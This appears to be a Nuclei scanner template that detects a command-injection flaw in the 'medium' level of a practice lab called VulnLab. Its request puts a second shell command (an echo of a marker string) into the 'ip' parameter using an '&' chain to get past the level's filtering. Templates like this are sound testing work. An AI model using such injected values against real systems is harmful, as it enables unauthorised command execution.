id: vulnlab-cmdi-medium

info:
  name: VulnLab 命令注入 medium 档（& 串接绕过）
  author: hediwen
  severity: critical
  tags: vulnlab,cmdi

http:
  - raw:
      - |
        GET /cmdi/medium.php?ip=127.0.0.1%20%26%20echo%20VULNLAB_CMDI_MARKER HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: regex
        part: body
        regex:
          - '命令输出</h3>\s*<pre[^>]*>[^<]*VULNLAB_CMDI_MARKER' 

